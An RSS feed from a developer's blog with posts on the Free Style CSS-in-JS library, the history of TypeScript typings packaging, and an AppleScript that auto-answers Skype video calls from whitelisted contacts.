<?xml version="1.0" encoding="utf-8" ?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Blake Embrey</title><atom:link href="http://blakeembrey.com/feed.xml" rel="self" type="application/rss+xml"></atom:link><link>http://blakeembrey.com</link><description>Avid software engineer who occasionally finds time to compose a few words.</description><lastBuildDate>Tue, 26 Jul 2016 20:52:11 +1000</lastBuildDate><language>en</language><item><title>Introduction to Free Style (and CSS-in-JS)</title><link>http://blakeembrey.com/articles/2016/01/intro-to-free-style-css-in-js</link><pubDate>Sun, 17 Jan 2016 14:45:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2016/01/intro-to-free-style-css-in-js</guid><author>Blake Embrey</author><description>&lt;p&gt;With the release of Free Style 1.0, I figure it&amp;#39;s about time to write about Free Style - how it works, why you&amp;#39;d want to use it and little introduction to CSS-in-JS. This has been a long time coming, with my first commit to Free Style over a year ago, and the first commit to Free Style in its current form 10 months ago. This is not a blog post designed to sway decisions - as always, you should use your own fair judgement.&lt;/p&gt;
&lt;h2 id=&quot;css-in-js&quot;&gt;CSS-in-JS&lt;/h2&gt;
&lt;p&gt;The idea of CSS-in-JS is well covered in &lt;a href=&quot;https://speakerdeck.com/vjeux/react-css-in-js&quot;&gt;this presentation by React engineer&lt;/a&gt;, Christopher Chedeau, and by &lt;a href=&quot;https://github.com/MicheleBertoli/css-in-js&quot;&gt;many&lt;/a&gt; &lt;a href=&quot;http://formidable.com/blog/2015/03/01/launching-radium/&quot;&gt;others&lt;/a&gt;, so I&amp;#39;ll be brief. As React popularized the declarative DOM, it also enabled a generation of CSS-in-JS approaches that attempt to solve the many pitfalls of CSS. These pitfalls are well known and documented, and including &amp;quot;features&amp;quot; such as the global namespace, constant sharing and many approaches to component isolation (BEM, SMACSS). Writing CSS in a way that avoids the pitfalls can be regarded an art.&lt;/p&gt;
&lt;p&gt;CSS-in-JS approaches exist to solve the pollution of the global namespace, constant sharing, component isolation, and bring many other unforeseen benefits. The JS part exists because these solutions utilize JavaScript as the way to provide namespacing, constant sharing and proper isolation. You may have already known, but these are things that have long been solved in programming languages, including JavaScript - with CommonJS, AMD and recently ES6 modules. It stands to reason that, if possible, JavaScript will provide a more sound foundation for writing modular CSS. Tooling for JavaScript is more mature, with the ability to do autocompletion, dead code elimination and linting common-place.&lt;/p&gt;
&lt;h2 id=&quot;how-and-why-does-free-style-work-&quot;&gt;How and Why Does Free Style Work?&lt;/h2&gt;
&lt;p&gt;Free Style works with hashes. If there&amp;#39;s one word you should love at the end of this section, it&amp;#39;s hashing. With that said, the essence of &lt;a href=&quot;https://github.com/blakeembrey/free-style/blob/master/src/free-style.ts&quot;&gt;free-style&lt;/a&gt; is less than 500 lines of code (in TypeScript), so I definitely suggest you check it out.&lt;/p&gt;
&lt;p&gt;Free Style is built on top of a core &lt;code&gt;Cache&lt;/code&gt; class. This class implements a way to append children using an ID (which is a hash), keeps track of how many times a child was added and removed, and can also attach simple change listeners (for when a child is added or removed). Three classes extend the &lt;code&gt;Cache&lt;/code&gt; implementation to replicate the structure of CSS - &lt;code&gt;Rule&lt;/code&gt;, &lt;code&gt;Style&lt;/code&gt; and &lt;code&gt;FreeStyle&lt;/code&gt;. The only other important class is &lt;code&gt;Selector&lt;/code&gt;, which implements a &lt;code&gt;Cacheable&lt;/code&gt; interface (&lt;code&gt;Cache&lt;/code&gt; fulfills the same interface).&lt;/p&gt;
&lt;p&gt;Using these four classes, we can replicate CSS in a way that automatically de-dupes styles. First, we create a &lt;code&gt;FreeStyle&lt;/code&gt; instance (it can be imagined as a &lt;code&gt;.css&lt;/code&gt; file). This class holds &lt;code&gt;Rule&lt;/code&gt; and &lt;code&gt;Style&lt;/code&gt; children. When you use &lt;code&gt;registerStyle&lt;/code&gt;, it&amp;#39;ll stringifying each object to CSS and hash the contents, while also propagating any rules upward (E.g. when &lt;code&gt;@media&lt;/code&gt; nested inside a style). The result is a single style registering (potentially) a number of &lt;code&gt;Style&lt;/code&gt; and &lt;code&gt;Rule&lt;/code&gt; instances, all of which have their hashes of their own contents. Throughout each instance creation, &lt;code&gt;registerStyle&lt;/code&gt; collects a separate hash that is returned as the CSS class name to use. Finally, when the final class name hash is known, the class name is interpolated with all selectors and returned for you to use.&lt;/p&gt;
&lt;p&gt;The result of this means that duplicate hashes are automatically merged. A duplicate hash means a duplicate rule, style or selector. The benefit of separating &lt;code&gt;Rule&lt;/code&gt; and &lt;code&gt;Style&lt;/code&gt; means that two identical media queries can be merged together (less CSS output) and so can identical styles within each context (E.g. identical styles inside and outside the media query can not be merged, but duplicates both inside or outside can be). The &lt;code&gt;Selector&lt;/code&gt; class exists because now that duplicates are merged, multiple selectors can exist for the same &lt;code&gt;Style&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The other interesting methods are &lt;code&gt;registerRule&lt;/code&gt; and &lt;code&gt;registerKeyframes&lt;/code&gt;. Both work similar to &lt;code&gt;registerStyle&lt;/code&gt;, but are much be simpler. &lt;code&gt;registerRule&lt;/code&gt; works by recursively registering rules, which are automatically being hashed based on the rule and their contents. &lt;code&gt;registerKeyframes&lt;/code&gt; works by creating rules and styles that get added to a &lt;code&gt;Rule&lt;/code&gt; instance and returns a selector of the complete hashed contents (hence keyframes are automatically hashed/namespaced).&lt;/p&gt;
&lt;p&gt;All this hashing results in the fact that all styles are automatically unique. Registered styles and keyframes have a hash to identify them and the chance of a conflicting style is now left to the computer to resolve, not you. The other pitfalls of CSS are automatically solved as the result of JavaScript, as the hash can only be known and exposed by the implementor while constants and isolation are now solved (you can even use NPM libraries for style manipulation now).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; One useful fact that may not be immediately obvious. By using hashes as the class name, it means output is &lt;em&gt;always&lt;/em&gt; consistent across front-end and back-end (E.g. in isomorphic applications).&lt;/p&gt;
&lt;h2 id=&quot;free-style-output-targets&quot;&gt;Free Style Output Targets&lt;/h2&gt;
&lt;p&gt;Now that you understand how Free Style works, the output targets should make a lot more sense. By default, Free Style exposes a feature-rich implementation ready for third-parties to build on top. To use it today, you must create instances of &lt;code&gt;FreeStyle&lt;/code&gt; (using &lt;code&gt;create()&lt;/code&gt;), merge any other instances and use &lt;code&gt;getStyles&lt;/code&gt; to get the CSS output. There&amp;#39;s an &lt;code&gt;inject()&lt;/code&gt; method, which will take the result of &lt;code&gt;getStyles&lt;/code&gt; and wrap it in &lt;code&gt;&amp;lt;style /&amp;gt;&lt;/code&gt; in the &lt;code&gt;&amp;lt;head /&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Currently, there are two other implementations of output targets. The first is &lt;a href=&quot;https://github.com/jkroso/easy-style&quot;&gt;&lt;code&gt;easy-style&lt;/code&gt;&lt;/a&gt;, a simple wrapper around the complex functionality in Free Style that abstracts away multiple &lt;code&gt;FreeStyle&lt;/code&gt; instances. It exposes three core methods - &lt;code&gt;style&lt;/code&gt;, &lt;code&gt;rule&lt;/code&gt;, &lt;code&gt;keyframe&lt;/code&gt; - avoiding the concept of multiple instances, which makes it suitable for most web-apps. There&amp;#39;s also &lt;a href=&quot;https://github.com/blakeembrey/react-free-style&quot;&gt;&lt;code&gt;react-free-style&lt;/code&gt;&lt;/a&gt;, which extends the core &lt;code&gt;FreeStyle&lt;/code&gt; class with the ability to wrap React components and use React&amp;#39;s &lt;code&gt;context&lt;/code&gt; for collecting all the styles used in the application. This is an interesting feature with interesting repercussions, such as only styles for the components on screen will be output in CSS (useful for minimizing the transfer size of isomorphic applications).&lt;/p&gt;
&lt;h2 id=&quot;other-css-in-js-solutions&quot;&gt;Other CSS-in-JS Solutions&lt;/h2&gt;
&lt;p&gt;A number of other CSS-in-JS solutions also exist, including &lt;a href=&quot;https://github.com/FormidableLabs/radium&quot;&gt;&lt;code&gt;radium&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://github.com/js-next/react-style&quot;&gt;&lt;code&gt;react-style&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://github.com/jsstyles/jss&quot;&gt;&lt;code&gt;jss&lt;/code&gt;&lt;/a&gt;. Radium takes an all JavaScript approach, while &lt;code&gt;jss&lt;/code&gt; and &lt;code&gt;react-style&lt;/code&gt; are more familiar. Where &lt;code&gt;jss&lt;/code&gt; and &lt;code&gt;react-style&lt;/code&gt; differ to &lt;code&gt;free-style&lt;/code&gt; is the approaches they take. Both went for namespacing in CSS by generating unique names instead of hashes. They also both went with &lt;code&gt;StyleSheet&lt;/code&gt; instances that you create once, while &lt;code&gt;free-style&lt;/code&gt; makes you register each style individually (and for a good reason, it allows linters to detect when a style is no longer used as it&amp;#39;ll appear as dead code). They may also restrict some subset of CSS that you can actually use for different reasons. As far as I can tell, neither go too much further into CSS tooling concepts such as style de-duping and minifying, which &lt;code&gt;free-style&lt;/code&gt; gives you for free with hashes.&lt;/p&gt;
</description></item><item><title>The State of TypeScript Packaging</title><link>http://blakeembrey.com/articles/2015/11/state-of-typescript-packaging</link><pubDate>Sun, 22 Nov 2015 16:00:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2015/11/state-of-typescript-packaging</guid><author>Blake Embrey</author><description>&lt;p&gt;&lt;em&gt;This blog post originally appeared on &lt;a href=&quot;http://angularclass.com/the-state-of-typescript-packages/&quot;&gt;Angular Class&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As a module author and developer, I love TypeScript. It allows me to write, publish and consume 100% type-safe JavaScript. Features like autocompletion, type validation and ES6 features are now part of my typical workflow. However, one step in this development lifecycle has always been broken for me. I&amp;#39;ve &lt;a href=&quot;https://github.com/blakeembrey/popsicle&quot;&gt;published&lt;/a&gt; &lt;a href=&quot;https://github.com/TypeStrong/tsconfig&quot;&gt;half&lt;/a&gt; &lt;a href=&quot;https://github.com/blakeembrey/free-style&quot;&gt;a&lt;/a&gt; &lt;a href=&quot;https://github.com/TypeStrong/ts-node&quot;&gt;dozen&lt;/a&gt; modules on NPM, but no one has ever been able to consume the type definitions from them. Why&amp;#39;s that?&lt;/p&gt;
&lt;p&gt;Let&amp;#39;s quickly take a step back. TypeScript includes a creative way for providing the type information of plain JavaScript files. These are &lt;code&gt;.d.ts&lt;/code&gt; files, also known as &amp;quot;typings&amp;quot;, which allows non-TypeScript packages to have a &lt;code&gt;.d.ts&lt;/code&gt; file written and mirror the runtime JavaScript implementation of that package. This decoupling of the runtime and type compiler is truly elegant, as the TypeScript compiler can output &lt;code&gt;.js&lt;/code&gt; and &lt;code&gt;.d.ts&lt;/code&gt; files together and it works as if it is all TypeScript. This has two amazing effects:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The greater community can write their own type definitions (&lt;code&gt;.d.ts&lt;/code&gt; files) for non-TypeScript packages - which is pretty much every popular library on NPM&lt;/li&gt;
&lt;li&gt;It promotes JavaScript as the first class citizen, something the first &amp;quot;compile-to-JS&amp;quot; languages like CoffeeScript failed to do (it promoted - through general availability - the use of things like &lt;code&gt;coffeescript/register&lt;/code&gt; at runtime)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;To help understand how we, as a community, got here and where we&amp;#39;re going next I&amp;#39;m going to give you a quick history lesson.&lt;/p&gt;
&lt;h2 id=&quot;the-past&quot;&gt;The Past&lt;/h2&gt;
&lt;p&gt;Welcome to the past, the wild west of &lt;code&gt;.d.ts&lt;/code&gt; files. A community project called &lt;a href=&quot;https://github.com/DefinitelyTyped/DefinitelyTyped&quot;&gt;DefinitelyTyped&lt;/a&gt;, started by &lt;a href=&quot;https://github.com/borisyankov&quot;&gt;Boris Yankov&lt;/a&gt;, is first committed to &lt;a href=&quot;https://github.com/DefinitelyTyped/DefinitelyTyped/commit/647369a322be470d84f8d226e297267a7d1a0796&quot;&gt;over three years ago&lt;/a&gt;. DefinitelyTyped has evolved 100 times over since the initial inception, but the core premise is to use ambient module declarations that define types for packages in NPM, Bower and the browser.&lt;/p&gt;
&lt;p&gt;What is an &lt;a href=&quot;https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/change-case/change-case.d.ts&quot;&gt;ambient module declaration&lt;/a&gt;?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ts&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;hljs-module&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;module&lt;/span&gt; &quot;change-case&quot; &lt;/span&gt;{
  &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;dot&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;s: &lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt;&lt;/span&gt;): &lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&lt;/span&gt;;
  &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;dotCase&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;s: &lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt;&lt;/span&gt;): &lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&lt;/span&gt;;
  [...]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Notice that &lt;code&gt;declare module &amp;quot;x&amp;quot;&lt;/code&gt; wraps everything. Declaring the module switches the TypeScript compilers understanding of this &lt;code&gt;.d.ts&lt;/code&gt; file. It enables you, as a developer, to use &lt;code&gt;import * as case from &amp;quot;change-case&amp;quot;&lt;/code&gt; or &lt;code&gt;import case = require(&amp;#39;change-case&amp;#39;)&lt;/code&gt;. This now imports the type information of &lt;code&gt;change-case&lt;/code&gt; from this declaration. Sounds brilliant, so what&amp;#39;s the drawback?&lt;/p&gt;
&lt;p&gt;You&amp;#39;re a module author and have a dozen of these NPM dependencies. You downloaded all the ambient modules declarations for your dependencies so you can use TypeScript for what it&amp;#39;s good at, making sure you&amp;#39;re using your dependencies correctly. Maybe you used TSD, or you copied the files from DefinitelyTyped manually. Now you need to publish your library so everyone else can use it. But how do you publish those typings so people who use the library don&amp;#39;t need to do all the work you did downloading the typings?&lt;/p&gt;
&lt;p&gt;The obvious solution might be to check in and publish the &lt;code&gt;typings/&lt;/code&gt; directory (created by &lt;code&gt;tsd&lt;/code&gt;) with the package. Fantastic, that was pretty simple. Look again though, how do those typings get referenced in your users projects? It would be creating all your dependencies in your users projects, even though they can&amp;#39;t access them. Talk about runtime inconsistency.&lt;/p&gt;
&lt;p&gt;TSD has a concept called &lt;code&gt;tsd link&lt;/code&gt;, which references the type definition (&lt;code&gt;typescript.definition&lt;/code&gt; in &lt;code&gt;package.json&lt;/code&gt;) from the &lt;code&gt;tsd.d.ts&lt;/code&gt; file in &lt;code&gt;typings/&lt;/code&gt;. That means the TypeScript definition in your module needs to be ambient and can&amp;#39;t just be the output from the TypeScript compiler. This kind of concept resulted in more hacks and tools as &lt;a href=&quot;https://github.com/SitePen/dts-generator&quot;&gt;&lt;code&gt;dts-generator&lt;/code&gt;&lt;/a&gt;, which takes the TypeScript compiler &lt;code&gt;.d.ts&lt;/code&gt; files and wraps them in your modules name so other tools can use them.&lt;/p&gt;
&lt;p&gt;Back to the sub-dependency case though, and you&amp;#39;re still being hung out to dry. You could have used &lt;code&gt;dts-generator&lt;/code&gt; to generate a single typings file for the library you just wrote, then published it to NPM with &lt;code&gt;typescript.definition&lt;/code&gt; (I know &lt;a href=&quot;https://github.com/TypeStrong/tsconfig/blob/61bc0ba5997de50432e92d24942cf9d9821f23df/package.json#L6-L8&quot;&gt;I did&lt;/a&gt;). Inevitability, when someone actually tries to use this the compiler will start to error because the &lt;a href=&quot;https://github.com/TypeStrong/atom-typescript/issues/682&quot;&gt;sub-dependency typings are missing&lt;/a&gt;. But what if we checked in &lt;code&gt;typings/&lt;/code&gt; like I mentioned? And our users had them automatically referenced?&lt;/p&gt;
&lt;p&gt;Better you don&amp;#39;t. But, if you must, &lt;a href=&quot;https://github.com/angular/angular/issues/5395&quot;&gt;this is what happens&lt;/a&gt;. If your users ever want to use the same module or declarations, you&amp;#39;ll run into conflicts. Even when they aren&amp;#39;t actually there at runtime. On top of this, any sub-dependency typings now introduce their own globals and typings that don&amp;#39;t even exist at runtime in my program.&lt;/p&gt;
&lt;p&gt;This can all manifest in a much larger and painful bug. Since everything is an ambient module declaration, there&amp;#39;s no way to confirm that what&amp;#39;s defined in typings is available at runtime. One such example is the ambient typings for &lt;a href=&quot;https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/es6-promise/es6-promise.d.ts&quot;&gt;&lt;code&gt;es6-promise&lt;/code&gt;&lt;/a&gt;, which defines the global &lt;code&gt;Promise&lt;/code&gt; class. Not only will the TypeScript compiler error with duplicate symbols when using ES6, this also implies that &lt;code&gt;Promise&lt;/code&gt; is available in my runtime. And that&amp;#39;s simply not true, which leads to code which can and will crash on node 0.10 (like I was for &lt;a href=&quot;https://travis-ci.org/blakeembrey/popsicle/jobs/88018081#L316&quot;&gt;popsicle&lt;/a&gt;). Now, isn&amp;#39;t this all the types of bugs I&amp;#39;m not meant to have anymore with TypeScript?&lt;/p&gt;
&lt;p&gt;Using global interfaces and variables that don&amp;#39;t exist at runtime to relay information to other dependencies is commonplace in DefinitelyTyped and leads to tight coupling of their definitions. This makes it difficult to revert broken behavior, like our global &lt;code&gt;Promise&lt;/code&gt; situation. I spent &lt;a href=&quot;https://github.com/DefinitelyTyped/tsd/issues/150&quot;&gt;more than six months&lt;/a&gt; after I started maintaining TSD trying to solve this problem. I eventually gave up on the approach, but not after I had spent weeks trying to make the TypeScript compiler to detect ambient module typings, follow ambient declarations through a custom type dependency tree that relies on using &lt;code&gt;/// &amp;lt;reference&amp;gt;&lt;/code&gt; to work and generate a single non-global polluting bundle.&lt;/p&gt;
&lt;h2 id=&quot;the-current&quot;&gt;The Current&lt;/h2&gt;
&lt;p&gt;Fortunately, most of my time on the TSD rewrite was spent solving and not patching the current system. I had built the new version to use external module declaration from the ground up, and only tried to build in support for ambient modules toward the end. External module declarations are those &lt;code&gt;.d.ts&lt;/code&gt; files that TypeScript emits when you use &lt;code&gt;tsc&lt;/code&gt; with &lt;code&gt;--declaration&lt;/code&gt; enabled, so support is already built right into the compiler. After many weeks of approaching the ambient module problem, I decided it would be faster and cleaner to skip it. This decision resulted in a new tool, called &lt;a href=&quot;https://github.com/typings/typings&quot;&gt;&lt;code&gt;typings&lt;/code&gt;&lt;/a&gt;, to be released.&lt;/p&gt;
&lt;p&gt;But what&amp;#39;s the difference between an ambient and external module?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ts&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;dot&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;s: &lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt;&lt;/span&gt;): &lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&lt;/span&gt;;
&lt;span class=&quot;hljs-keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;dotCase&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;s: &lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt;&lt;/span&gt;): &lt;span class=&quot;hljs-title&quot;&gt;string&lt;/span&gt;&lt;/span&gt;;
[...]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Notice that this snippet is pretty similar to the previous one, but there&amp;#39;s no more &lt;code&gt;declare module &amp;quot;change-case&amp;quot;&lt;/code&gt; around the block and I&amp;#39;m exporting the functions directly. This is what makes our typings portable, as we can re-use the same type definition anywhere else under a different names and module resolution strategies. For example, when we use Browserify or Webpack aliases, or with the &lt;code&gt;moduleResolution&lt;/code&gt; in TypeScript 1.6.&lt;/p&gt;
&lt;p&gt;It&amp;#39;s not enough to just support external module declarations. What does that even mean if the TypeScript compiler can use them? It means that [typings]&lt;a href=&quot;https://github.com/typings/typings&quot;&gt;typings&lt;/a&gt;, an open source CLI, can use a reference to &lt;code&gt;.d.ts&lt;/code&gt; files in GitHub or on NPM and have them &amp;quot;just work&amp;quot;, with proper namespaces and no global leaks. If you&amp;#39;re an author now, you might be wondering - how do I use this with my own module adn have things &amp;quot;just work&amp;quot; for my users?&lt;/p&gt;
&lt;p&gt;This is where &lt;code&gt;typings.json&lt;/code&gt; comes in. Since I was heavily exposed to all the issues with DefinitelyTyped and TSD, I needed to solve &lt;strong&gt;everything&lt;/strong&gt;. And typings comes very close to doing just that. A module author no longer needs to check in &lt;code&gt;typings/&lt;/code&gt;, but &lt;code&gt;typings.json&lt;/code&gt;. This enables the user to use &lt;code&gt;typings&lt;/code&gt; themselves and have things resolve automatically. All of your dependencies become properly namespaced and do not pollute your users typings (you aren&amp;#39;t implicitly introducing bugs to your users anymore, which would be bad). Also, typings installation is entirely decentralized and the typings themselves can be downloaded from almost anywhere - GitHub, NPM, Bower and even over HTTP or the filesystem (yes, you can still check them in, but they aren&amp;#39;t ambient anymore).&lt;/p&gt;
&lt;p&gt;This decentralization solves the biggest pain point I see with maintaining DefinitelyTyped. How does an author of one typings package maintain their file in DefinitelyTyped when they get notifications on thousands of others? How do you make sure typings maintain quality when you have 1000s to review? The solution in typings is you don&amp;#39;t, the community does. If typings are incorrect, I can just write and install my own from wherever I want, something that TSD doesn&amp;#39;t really allow. There&amp;#39;s no merge or review process you need to wait for (&lt;a href=&quot;https://github.com/DefinitelyTyped/DefinitelyTyped/pulls&quot;&gt;300+ open pull requests&lt;/a&gt;!).&lt;/p&gt;
&lt;p&gt;However, decentralization comes with the cost of discoverability. To solve this, a &lt;a href=&quot;https://github.com/typings/registry&quot;&gt;registry&lt;/a&gt; exists that maintains locations of where the best typing can currently be installed from, for any version. If there&amp;#39;s a newer typing, patches, or the old typing author has somehow disappeared, you can replace the entry with your own so people will be directed to your typings from now on. There&amp;#39;s also protections in place as JavaScript packages slowly include their own typings, all to enable authors to continue moving quickly.&lt;/p&gt;
&lt;h2 id=&quot;the-future&quot;&gt;The Future&lt;/h2&gt;
&lt;p&gt;The future is fast approaching, a place where there&amp;#39;ll be official standards in place. With the release of typings, there is now collaboration in place with the &lt;a href=&quot;https://github.com/typings/meta/issues/3&quot;&gt;TypeScript team&lt;/a&gt; to solve the consumption of typings. With ideas like &lt;a href=&quot;https://github.com/Microsoft/TypeScript/pull/4913&quot;&gt;package scopes&lt;/a&gt; being merged into the TypeScript compiler, typings can and will be compiled into a package scoped &lt;code&gt;.d.ts&lt;/code&gt; file. This will enable module authors to bundle their typings before they publish and the consumer will never have to do anything. And this isn&amp;#39;t too far away from today.&lt;/p&gt;
&lt;p&gt;No solution is possible without community support, so please get involved with &lt;a href=&quot;https://github.com/typings/typings&quot;&gt;typings&lt;/a&gt; and ask JavaScript module authors to add completed type definitions to the packages you use. Better yet, open a PR yourself and help them out - they might not even know what TypeScript is.&lt;/p&gt;
&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;So, in summary, the current landscape looks something like this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ambient modules are not portable&lt;/li&gt;
&lt;li&gt;TypeScript only outputs external modules&lt;/li&gt;
&lt;li&gt;Publishing TypeScript packages is not possible&lt;/li&gt;
&lt;li&gt;Maintaining DefinitelyTyped is hard, for contributions and tooling&lt;/li&gt;
&lt;li&gt;Typings need simple APIs for IDEs to present developers with warnings and straightforward solutions&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/typings/typings&quot;&gt;Typings&lt;/a&gt; solves all of this and is currently working on fixing the more obscure use-cases. If you find yourself running into an issue or with more questions, please &lt;a href=&quot;https://github.com/typings/typings/issues&quot;&gt;open an issue&lt;/a&gt; in the &lt;code&gt;typings&lt;/code&gt; repository.&lt;/p&gt;
</description></item><item><title>Skype Auto Answer with AppleScript</title><link>http://blakeembrey.com/articles/2015/06/skype-auto-answer-with-applescript</link><pubDate>Mon, 22 Jun 2015 02:00:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2015/06/skype-auto-answer-with-applescript</guid><author>Blake Embrey</author><description>&lt;p&gt;After discovering the ability to &lt;a href=&quot;/articles/2015/06/facetime-auto-answer-applescript/&quot;&gt;auto answer FaceTime&lt;/a&gt;, I tried my hand at adapting the script for Skype. I waited a couple of days until my girlfriend had some downtime and patience to call me over and over while I tried to debug the elements on my screen. Eventually I figured out how to select the window, and then the correct button. I did try, unsuccessfully, for a long time to select the button based on the label. If anyone knows how to do this, please leave a comment!&lt;/p&gt;
&lt;p&gt;Continuing on, set up is much the same with only the basic code changed. Let&amp;#39;s start again by opening up &amp;quot;Script Editor&amp;quot; and copying this snippet into the editor:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-applescript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt; contacts &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; {&lt;span class=&quot;hljs-string&quot;&gt;&quot;Keyue Bao&quot;&lt;/span&gt;}

&lt;span class=&quot;hljs-keyword&quot;&gt;repeat&lt;/span&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;repeat&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;application&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Skype&quot;&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-property&quot;&gt;running&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;tell&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;application&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;System Events&quot;&lt;/span&gt;
      &lt;span class=&quot;hljs-keyword&quot;&gt;tell&lt;/span&gt; process &lt;span class=&quot;hljs-string&quot;&gt;&quot;Skype&quot;&lt;/span&gt;
        &lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt; videoCallWindow &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;a reference&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;first&lt;/span&gt; window &lt;span class=&quot;hljs-keyword&quot;&gt;whose&lt;/span&gt; &lt;span class=&quot;hljs-property&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Incoming Video Call&quot;&lt;/span&gt;)

        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; videoCallWindow exists &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt;
          &lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt; callerId &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; value &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; static &lt;span class=&quot;hljs-type&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; videoCallWindow

          &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; contacts &lt;span class=&quot;hljs-keyword&quot;&gt;contains&lt;/span&gt; callerId &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt;
            click button &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; videoCallWindow
          &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;
        &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;
      &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;tell&lt;/span&gt;
    &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;tell&lt;/span&gt;
    &lt;span class=&quot;hljs-command&quot;&gt;delay&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;repeat&lt;/span&gt;
  &lt;span class=&quot;hljs-command&quot;&gt;delay&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;repeat&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
